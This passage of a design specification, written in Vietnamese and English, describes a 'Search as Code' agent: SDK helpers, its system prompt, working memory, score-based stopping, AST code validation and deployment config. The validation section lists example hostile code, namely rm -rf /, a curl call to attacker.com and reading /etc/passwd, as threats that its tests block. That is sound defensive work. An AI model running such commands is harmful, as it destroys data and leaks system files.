    Dùng trong CVE Part 2: unique(expanded_queries) trước khi execute.
    """
    seen = set()
    result = []
    for item in items:
        key = json.dumps(item, sort_keys=True)
        if key not in seen:
            seen.add(key)
            result.append(item)
    return result

def summarize(items: List[Dict], by: List[str]) -> str:
    """
    Group items by multiple fields và trả về coverage summary dạng string.
    Dùng trong CVE Part 2: summarize(pages, by=["vendor", "year", "url_kind"])
    để model biết vendor-year nào còn sparse → generate refined queries.
    """
    from collections import defaultdict
    groups = defaultdict(int)
    for item in items:
        key = tuple(item.get(f, "unknown") for f in by)
        groups[key] += 1
    lines = [f"{dict(zip(by, k))}: {v} pages" for k, v in sorted(groups.items())]
    return "\n".join(lines)
```

---

### Low-level: transform primitives

```python
# app/sdk/low_level/transform.py

def cluster(
    items: List[Dict],
    vectors: List[List[float]],
    n_clusters: int = 5
) -> List[List[Dict]]:
    """K-means clustering trên embedding vectors."""
    ...

def chunk(
    text: str,
    strategy: str = "paragraph",   # "sentence" | "paragraph" | "fixed"
    size: int = 512
) -> List[str]:
    """Split text thành chunks theo strategy."""
    ...

def parse_field(
    hit: Dict,
    field: str   # "published_date" | "severity" | "cve_id" | ...
) -> Any:
    """Extract và normalize một field từ raw hit."""
    ...
```

> `_extract_single` là internal helper của `LLMSDK.extract_many()` — xem `app/sdk/high_level/llm.py`.

---

## 11. Model Layer (Codegen Control Plane)

> System prompt đầy đủ nằm trong `app/graph/nodes/planner.py` → `_build_system_prompt()`.
> Đây là bản rút gọn để tham khảo nhanh.

### Cấu trúc system prompt trong PLANNER node

```python
# app/graph/nodes/planner.py → _build_system_prompt()

SYSTEM_PROMPT_TEMPLATE = """
You are a Search as Code (SaC) agent. Your job is to generate Python code
that uses the Agentic Search SDK to retrieve, process, and structure
information needed to complete a task.

## AVAILABLE SDK

### sdk.search.* — Search pipelines
- sdk.search.web_many(queries, limit_per_query, concurrency) → list[list[SearchHit]]
- sdk.search.deep_search(query, depth, strategy) → list[SearchHit]

### sdk.llm.* — LLM-powered operations
- sdk.llm.extract_many(items, instruction, schema) → list[dict]
- sdk.llm.query_llm(prompt) → str
- sdk.llm.parse_jsonl(text) → list

### Low-level atomized primitives (compose freely)
- sdk.retrieve(query, source, limit) → list[SearchHit]
- sdk.fanout(base_query, variants, concurrency) → list[SearchHit]
- sdk.rank(hits, method, top_k) → list[SearchHit]
- sdk.dedupe(items, key) → list
- sdk.embed(texts) → list[list[float]]
- sdk.cluster(items, vectors, n_clusters) → list[list]
- sdk.chunk(text, strategy, size) → list[str]
- sdk.parse_field(hit, field) → Any

### Utility helpers
- sdk.join_result_fields(hit) → str
- sdk.official_vendor_advisory(url, vendor) → bool
- sdk.infer_vendor(url) → str
- sdk.flatten(list_of_lists) → list
- sdk.unique(items) → list
- sdk.summarize(items, by) → str

## STATE MANAGEMENT
- STATE_DIR is available as a Path object
- Always serialize state to filesystem between turns
- Load state from filesystem at start of each turn
- Write final results to STATE_DIR / "final_results.json"
- When you believe the task is complete, also write STATE_DIR / "completion_signal.json":
  `{"coverage_score": float, "confidence_score": float, "reason": str}`
  Observer sẽ dùng scores này để quyết định dừng vòng lặp — không phụ thuộc vào việc bạn print TASK_COMPLETE.
  (Print TASK_COMPLETE vẫn có thể dùng như fallback signal, nhưng không phải primary mechanism.)

## PRINCIPLES
- Use sdk.search.* and sdk.llm.* for common patterns
- Use low-level primitives when the task requires custom orchestration
- Fan out queries in parallel for broad coverage (sdk.search.web_many or sdk.fanout)
- Verify results with sdk.llm.extract_many before finalizing
- Deduplicate aggressively with sdk.dedupe
- Filter by confidence threshold (>= 0.75)
- Write gap-fill code for any capability not in the SDK (validation, scoring, regex, etc.)
"""
```

---

## 11b. Chi Tiết Implementation: Working Memory, Score-Based Stopping, AST Validation

### Reasoner: Working Memory thay vì toàn bộ Message History

**Vấn đề**: Sau 5–10 turns, `messages` list trong `AgentState` phình to. Truyền toàn bộ vào Reasoner gây:
- Chi phí token tăng tuyến tính theo số turns
- Model bắt đầu "quên" thông tin đầu do attention dilution
- Latency tăng dù phần lớn history không cần thiết

**Giải pháp**: Reasoner build một **working memory** compact từ state trước mỗi LLM call — thay vì truyền raw `messages`.

```python
# app/graph/nodes/reasoner.py

def build_working_memory(state: AgentState) -> str:
    """
    Tổng hợp trạng thái hiện tại thành một string compact để inject vào prompt.
    Reasoner chỉ cần biết: đang ở đâu, đã có gì, cần làm gì tiếp — không cần toàn bộ lịch sử.
    """
    lines = [
        f"## Task\n{state['directive']}",
        f"## Turn\n{state['turn_count']} / {state['max_turns']}",
    ]

    # Tóm tắt các turns trước — chỉ giữ outcome, không giữ full code/stdout
    if state.get("turn_summaries"):
        lines.append("## Previous turns (summaries)")
        for s in state["turn_summaries"]:
            lines.append(f"- Turn {s['turn']}: {s['action']} → {s['outcome']}")

    # State files hiện có trên filesystem (để model biết có thể load gì)
    if state.get("state_files"):
        lines.append("## Available state files")
        for f in state["state_files"]:
            lines.append(f"  - {f}")

    # Coverage snapshot gần nhất (nếu có)
    if state.get("last_coverage_summary"):
        lines.append(f"## Coverage so far\n{state['last_coverage_summary']}")

    # Lỗi gần nhất (nếu có) để model tự sửa
    if state.get("last_error"):
        lines.append(f"## Last error\n{state['last_error']}")

    return "\n\n".join(lines)


async def reasoner_node(state: AgentState, config) -> AgentState:
    working_memory = build_working_memory(state)
    messages = [
        {"role": "system", "content": state["system_prompt"]},
        {"role": "user", "content": working_memory},
    ]
    # Single LLM call với working memory — không phải full history
    response = await llm.ainvoke(messages)
    code = extract_code_block(response.content)
    return {**state, "generated_code": code}
```

**Lưu ý quan trọng**: `AgentState` cần thêm các fields:
- `turn_summaries: list[dict]` — EXECUTOR node ghi sau mỗi turn (action + outcome ngắn gọn)
- `state_files: list[str]` — EXECUTOR node cập nhật sau mỗi lần write file
- `last_coverage_summary: str | None` — OBSERVER node cập nhật
- `last_error: str | None` — EXECUTOR node ghi khi có lỗi

---

### Observer: Score-Based Stopping

**Vấn đề**: Dùng `TASK_COMPLETE` print làm primary stop signal là brittle — model có thể print sớm, muộn, hoặc không bao giờ print. Observer bị động, không chủ động kiểm soát được vòng lặp.

**Giải pháp**: Observer chủ động đọc `completion_signal.json` (nếu có) và evaluate scores. `TASK_COMPLETE` print chỉ là fallback.

```python
# app/graph/nodes/observer.py

import json
from pathlib import Path

# Định nghĩa rõ ràng để không phải con số tùy tiện:
# coverage_score: tỉ lệ sub-tasks/queries đã có kết quả đủ tốt (0.0 – 1.0)
#   Ví dụ: 18/20 vendor-year pairs đã có ≥1 verified hit → coverage = 0.9
# confidence_score: average confidence của các kết quả cuối cùng (0.0 – 1.0)
#   Lấy từ ExtractionResult.confidence trung bình, hoặc model tự estimate
COVERAGE_THRESHOLD = 0.9
CONFIDENCE_THRESHOLD = 0.8

async def observer_node(state: AgentState, config) -> AgentState:
    state_dir = Path(state["state_dir"])
    stdout = state["last_stdout"]

    coverage_score = state.get("coverage_score", 0.0)
    confidence_score = state.get("confidence_score", 0.0)
    is_complete = False

    # Primary: đọc completion_signal.json do model write
    signal_path = state_dir / "completion_signal.json"
    if signal_path.exists():
        try:
            signal = json.loads(signal_path.read_text())
            coverage_score = float(signal.get("coverage_score", 0.0))
            confidence_score = float(signal.get("confidence_score", 0.0))
            if coverage_score > COVERAGE_THRESHOLD and confidence_score > CONFIDENCE_THRESHOLD:
                is_complete = True
        except (json.JSONDecodeError, ValueError):
            pass  # Malformed signal → tiếp tục vòng lặp

    # Fallback: TASK_COMPLETE print từ model
    if not is_complete and "TASK_COMPLETE" in stdout:
        is_complete = True

    # Load results nếu complete
    final_results = None
    if is_complete:
        results_path = state_dir / "final_results.json"
        if results_path.exists():
            final_results = json.loads(results_path.read_text())

    # Cập nhật coverage summary vào state để Reasoner dùng ở turn sau
    coverage_summary = None
    if not is_complete and state_dir.joinpath("coverage_summary.txt").exists():
        coverage_summary = state_dir.joinpath("coverage_summary.txt").read_text()

    return {
        **state,
        "coverage_score": coverage_score,
        "confidence_score": confidence_score,
        "is_complete": is_complete,
        "final_results": final_results,
        "last_coverage_summary": coverage_summary,
    }
```

**Định nghĩa rõ `coverage_score` và `confidence_score`** (phải spec rõ trong SKILL.md để model không tự tiện đặt số):

| Score | Định nghĩa | Ví dụ CVE case study |
|---|---|---|
| `coverage_score` | `verified_targets / total_targets` — tỉ lệ sub-tasks đã có kết quả hợp lệ | `verified_cve_vendor_pairs / total_cve_vendor_pairs` |
| `confidence_score` | Mean của `ExtractionResult.confidence` trên tất cả final records, hoặc model estimate | Mean confidence của 200 CVE records đã extract |

---

### AST Validation Trước Execute

**Vấn đề**: `SandboxExecutor` hiện tại chạy thẳng subprocess trên model-generated code mà không kiểm tra. Model có thể generate:
- `import os; os.system("rm -rf /")` 
- `import subprocess; subprocess.run(["curl", "http://attacker.com", ...])`
- `open("/etc/passwd").read()`
- Import thư viện không được phép (`requests`, `paramiko`, v.v.)

**Giải pháp**: AST validation chạy **trước** `subprocess.run`, không phải sau. Xem implementation đầy đủ ở Section 9 (`ASTValidator`, `validate_code`, `ALLOWED_IMPORTS`, `BLOCKED_CALLS`).

**Nguyên tắc quan trọng**:
- Parse bằng `ast.parse()` — không thể bị bypass bằng string obfuscation
- `ALLOWED_IMPORTS` là allowlist (whitelist), không phải blocklist — mặc định từ chối tất cả
- `returncode=2` cho validation failure — phân biệt rõ với runtime error (`returncode=1`) và success (`returncode=0`)
- EXECUTOR node phải log validation errors vào `turn_summaries` để Reasoner biết và tự sửa code ở turn tiếp theo

**Test cases bắt buộc** (thêm vào `tests/unit/test_sandbox.py`):
```python
# test_ast_validation.py
def test_blocks_os_import():
    errors = validate_code("import os\nos.system('ls')")
    assert any("os" in e for e in errors)

def test_blocks_subprocess():
    errors = validate_code("import subprocess\nsubprocess.run(['ls'])")
    assert len(errors) > 0

def test_blocks_open():
    errors = validate_code("data = open('/etc/passwd').read()")
    assert any("open" in e for e in errors)

def test_allows_sdk():
    errors = validate_code("from app.sdk import sdk\nresults = sdk.retrieve('query')")
    assert errors == []

def test_allows_json_re():
    errors = validate_code("import json, re\ndata = json.loads('{}')")
    assert errors == []
```

---

## 12. Performance Benchmarks (từ nghiên cứu)

Sử dụng để validate implementation:

| Benchmark | SaC Score | Target |
|---|---|---|
| DSQA | 0.871 | ≥ 0.85 |
| BrowseComp | 0.805 | ≥ 0.75 |
| HLE | 0.612 | ≥ 0.55 |
| WideSearch (F1) | 0.651 | ≥ 0.60 |
| WANDR | 0.386 | ≥ 0.30 |

### CVE Case Study metrics (regression test)
- Accuracy: 100% trên 200+ CVE records
- Token reduction: 85.1% so với non-SaC baseline (288.7K → 42.9K tokens)
- Scoring: non-Perplexity systems đều < 25%

### Cost-Performance targets
- Low reasoning: rẻ hơn competitors, performance competitive
- Medium reasoning: outperform all non-SaC tại < $1/task (DSQA)
- High reasoning: top performance với competitive cost

---

## 13. Environment Variables

```bash
# .env.example

# Database
DATABASE_URL=postgresql+asyncpg://user:password@localhost:5432/sac_db

# Redis
REDIS_URL=redis://localhost:6379/0

# LLM Providers
ANTHROPIC_API_KEY=sk-ant-...
OPENAI_API_KEY=sk-...

# Search Providers
PERPLEXITY_API_KEY=pplx-...
SERP_API_KEY=...

# Sandbox
SANDBOX_TIMEOUT_SECONDS=300
SANDBOX_MAX_OPERATIONS=1000
SANDBOX_STATE_DIR=/tmp/sac_states

# API
API_HOST=0.0.0.0
API_PORT=8000
API_WORKERS=4

# Autoresearch loop (optional)
AUTORESEARCH_ENABLED=false
AUTORESEARCH_INTERVAL_HOURS=24
```

---

## 14. Docker Compose

```yaml
# docker/docker-compose.yml
version: "3.9"

services:
  api:
    build:
      context: ..
      dockerfile: docker/Dockerfile
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=postgresql+asyncpg://sac:sac@db:5432/sac_db
      - REDIS_URL=redis://redis:6379/0
    depends_on:
      - db
      - redis
    volumes:
      - sandbox_state:/tmp/sac_states

  worker:
    build:
      context: ..
      dockerfile: docker/Dockerfile
    command: python -m app.workers.task_worker
    environment:
      - DATABASE_URL=postgresql+asyncpg://sac:sac@db:5432/sac_db
      - REDIS_URL=redis://redis:6379/0
    depends_on:
      - db
      - redis
    volumes:
      - sandbox_state:/tmp/sac_states

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: sac
      POSTGRES_PASSWORD: sac
      POSTGRES_DB: sac_db
    volumes:
      - postgres_data:/var/lib/postgresql/data

  redis:
    image: redis:7-alpine
    volumes:
      - redis_data:/data

volumes:
  postgres_data:
  redis_data:
  sandbox_state:
```

---

## 15. Implementation Roadmap

### Phase 1 — Core Infrastructure (tuần 1-2)
- [ ] FastAPI app skeleton + health endpoint
- [ ] PostgreSQL setup + Alembic migrations (`sac_tasks`, `sdk_operations`)
- [ ] Redis setup
- [ ] Basic `SearchHit`, `ExtractionResult` type definitions
- [ ] High-level: `sdk.search.web_search()` single search
- [ ] High-level: `sdk.search.web_many()` parallel fan-out search
- [ ] Low-level: `sdk.retrieve()` atomic retrieval
- [ ] Low-level: `sdk.fanout()` query variant fan-out
- [ ] Unit tests cho cả hai tầng SDK search

### Phase 2 — Sandbox & State (tuần 3-4)
- [ ] `SandboxExecutor` với subprocess isolation
- [ ] Filesystem-based state manager (serialize/deserialize helpers)
- [ ] SDK injection vào sandbox namespace (cả hai tầng + `sdk.llm.*`)
- [ ] Timeout và resource limit enforcement
- [ ] Low-level: `sdk.dedupe()` by arbitrary key
- [ ] Low-level: `sdk.rank()` (bm25 / semantic / hybrid)
- [ ] Low-level: `sdk.embed()` embedding generation
- [ ] Low-level: `sdk.cluster()`, `sdk.chunk()`, `sdk.parse_field()`
- [ ] `sdk.llm.extract_many()` batch structured extraction
- [ ] `sdk.llm.query_llm()`, `sdk.llm.parse_jsonl()`
- [ ] Utility: `sdk.unique()`, `sdk.summarize()`, helpers
- [ ] High-level: `sdk.search.deep_search()` multi-hop
- [ ] Integration tests sandbox execution

### Phase 3 — LangGraph ReAct Loop (tuần 5-6)
- [ ] `AgentState` TypedDict với reducers (bao gồm `working_memory`, `coverage_score`, `confidence_score`)
- [ ] Node `planner` — khởi tạo state, build system prompt + SKILL.md
- [ ] Node `reasoner` — build **working memory** từ state (không truyền toàn bộ message history), LLM call, extract code block
- [ ] Node `executor` — **AST validation** trước khi gọi `SandboxExecutor`, build observation message
- [ ] Node `observer` — compute `coverage_score` + `confidence_score`, set `is_complete` (score-based primary, `TASK_COMPLETE` print là fallback), load `final_results.json`
- [ ] Node `finalizer` — format output, tổng hợp metrics
- [ ] `should_continue()` conditional edge: dừng khi `coverage_score > 0.9 AND confidence_score > 0.8`, max_turns đạt, hoặc 3 lần lỗi liên tiếp
- [ ] `build_sac_graph()` với `AsyncPostgresSaver` checkpointer
- [ ] Unit tests từng node riêng lẻ

### Phase 4 — API & Task Management (tuần 7-8)
- [ ] `POST /api/v1/search` sync endpoint (graph.ainvoke)
- [ ] `POST /api/v1/search/stream` SSE streaming (graph.astream_events)
- [ ] `POST /api/v1/search/async` + `GET /{task_id}` polling
- [ ] ARQ worker cho background tasks
- [ ] SDK direct endpoints
- [ ] Integration tests end-to-end ReAct loop

### Phase 5 — Benchmarks & Optimization (tuần 9-10)
- [ ] CVE case study regression test (target: 100% accuracy, 85% token reduction)
- [ ] DSQA benchmark runner (target: ≥ 0.85)
- [ ] Working memory token tracking — đo tiết kiệm so với full message history
- [ ] Cost calculation per task
- [ ] Performance profiling và optimization
- [ ] Autoresearch loop cho SDK + SKILL.md (optional)

---

## 16. Điểm Khác Biệt Quan Trọng So Với Traditional Search

| Aspect | Traditional | Search as Code |
|---|---|---|
| Interface | Function call / MCP | Python code generation |
| Pipeline | Predefined cố định | Model-generated mỗi task |
| SDK design | Monolithic (retrieve→filter→rerank→context) | Hai tầng: high-level pipelines + low-level atomized primitives |
| Control | Query parameters only | Toàn bộ pipeline (compose tự do từ primitives) |
| Operations/turn | 1-few | Thousands |
| Intermediate state | Token space | Filesystem (explicit serde) |
| Domain knowledge | Cannot leverage | Encodable trong code |
| Parallelism | Sequential model turns | Native async trong sandbox |
| Gap-filling | Impossible | Model viết thêm code |

---

## Tài Liệu Tham Khảo

- [Rethinking Search as Code Generation](https://research.perplexity.ai/articles/rethinking-search-as-code-generation) — Perplexity AI Research, Jun 1 2026
- [Architecting and Evaluating an AI-First Search API](https://research.perplexity.ai/articles/architecting-and-evaluating-an-ai-first-search-api) — Sep 2025
- [DeepSearchQA (DSQA)](https://arxiv.org/abs/2601.20975)
- [BrowseComp](https://arxiv.org/abs/2504.12516)
- [Humanity's Last Exam (HLE)](https://arxiv.org/abs/2501.14249)
- [WideSearch](https://arxiv.org/abs/2508.07999)
